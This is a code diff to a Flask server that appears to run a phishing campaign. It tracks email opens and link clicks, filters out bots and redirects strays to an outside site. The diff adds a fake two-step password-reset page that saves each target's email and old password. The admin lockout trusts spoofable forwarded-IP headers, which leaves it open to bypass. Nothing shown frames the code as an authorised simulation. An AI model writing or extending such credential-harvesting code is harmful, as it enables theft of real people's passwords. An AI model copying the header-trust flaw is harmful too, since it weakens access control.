@@ -24,7 +24,7 @@ def restrict_admin_to_localhost():
                 request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                 request.remote_addr
     is_local = client_ip in ('127.0.0.1', '::1', 'localhost')
-    public_paths = ('/track/', '/account/', '/login/', '/submit/', '/static/')
+    public_paths = ('/track', '/account', '/login', '/submit', '/submit_step1', '/reset', '/static')
     if not is_local and not any(request.path.startswith(p) for p in public_paths):
         return Response('<h1>403 Forbidden</h1><p>Access restricted.</p>', status=403)
 
@@ -400,6 +400,11 @@ def _is_bot(target):
     delta = (datetime.datetime.utcnow() - target.sent_at).total_seconds()
     return delta < 5
 
+def get_client_ip():
+    return request.headers.get('CF-Connecting-IP') or \
+           request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
+           request.remote_addr
+
 @app.route('/track/open/<tracking_id>')
 def track_open(tracking_id):
     target = Target.query.filter_by(tracking_id=tracking_id).first()
@@ -407,7 +412,7 @@ def track_open(tracking_id):
         event = Event(
             type='open',
             target_id=target.id,
-            ip_address=request.remote_addr,
+            ip_address=get_client_ip(),
             user_agent=request.user_agent.string,
             is_bot=_is_bot(target)
         )
@@ -420,10 +425,10 @@ def track_open(tracking_id):
 def masked_click():
     t = request.args.get('session')
     if not t:
-        return redirect('https://microsoft.com')
+        return redirect('https://moirashire.com')
     target = Target.query.filter_by(tracking_id=t).first()
     if not target:
-        return redirect('https://microsoft.com')
+        return redirect('https://moirashire.com')
 
     bot = _is_bot(target)
 
@@ -432,14 +437,14 @@ def masked_click():
     if not already_opened:
         db.session.add(Event(
             type='open', target_id=target.id,
-            ip_address=request.remote_addr,
+            ip_address=get_client_ip(),
             user_agent=request.user_agent.string,
             is_bot=bot
         ))
 
     db.session.add(Event(
         type='click', target_id=target.id,
-        ip_address=request.remote_addr,
+        ip_address=get_client_ip(),
         user_agent=request.user_agent.string,
         is_bot=bot
     ))
@@ -452,19 +457,50 @@ def landing_page(tracking_id):
     target = Target.query.filter_by(tracking_id=tracking_id).first_or_404()
     return render_template('landing.html', tracking_id=tracking_id)
 
+@app.route('/submit_step1/<tracking_id>', methods=['POST'])
+def submit_step1(tracking_id):
+    target = Target.query.filter_by(tracking_id=tracking_id).first_or_404()
+    data = request.form.to_dict()
+    # Save step 1 data (email, old_password)
+    form_data = FormData(data=data, target_id=target.id, ip_address=get_client_ip())
+    db.session.add(form_data)
+
+    # Infer open/click if they bypassed the email link somehow
+    already_opened = Event.query.filter_by(target_id=target.id, type='open').first()
+    if not already_opened:
+        db.session.add(Event(type='open', target_id=target.id,
+                             ip_address=get_client_ip(),
+                             user_agent=request.user_agent.string,
+                             is_bot=False))
+
+    already_clicked = Event.query.filter_by(target_id=target.id, type='click').first()
+    if not already_clicked:
+        db.session.add(Event(type='click', target_id=target.id,
+                             ip_address=get_client_ip(),
+                             user_agent=request.user_agent.string,
+                             is_bot=False))
+                             
+    db.session.commit()
+    return redirect(url_for('reset_password_page', tracking_id=tracking_id))
+
+@app.route('/reset/<path:tracking_id>')
+def reset_password_page(tracking_id):
+    target = Target.query.filter_by(tracking_id=tracking_id).first_or_404()
+    return render_template('landing_step2.html', tracking_id=tracking_id)
+
 @app.route('/submit/<tracking_id>', methods=['POST'])
 def submit_data(tracking_id):
     target = Target.query.filter_by(tracking_id=tracking_id).first_or_404()
     data = request.form.to_dict()
     # Always append — capture ALL submissions (Fix 4)
-    form_data = FormData(data=data, target_id=target.id, ip_address=request.remote_addr)
+    form_data = FormData(data=data, target_id=target.id, ip_address=get_client_ip())
     db.session.add(form_data)
 
     # Infer open if pixel was blocked
     already_opened = Event.query.filter_by(target_id=target.id, type='open').first()
     if not already_opened:
         db.session.add(Event(type='open', target_id=target.id,
-                             ip_address=request.remote_addr,
+                             ip_address=get_client_ip(),
                              user_agent=request.user_agent.string,
                              is_bot=False))
 
@@ -472,12 +508,12 @@ def submit_data(tracking_id):
     already_clicked = Event.query.filter_by(target_id=target.id, type='click').first()
     if not already_clicked:
         db.session.add(Event(type='click', target_id=target.id,
-                             ip_address=request.remote_addr,
+                             ip_address=get_client_ip(),
                              user_agent=request.user_agent.string,
                              is_bot=False))
 
     db.session.add(Event(type='submit', target_id=target.id,
-                         ip_address=request.remote_addr,
+                         ip_address=get_client_ip(),
                          user_agent=request.user_agent.string,
                          is_bot=False))
     db.session.commit()
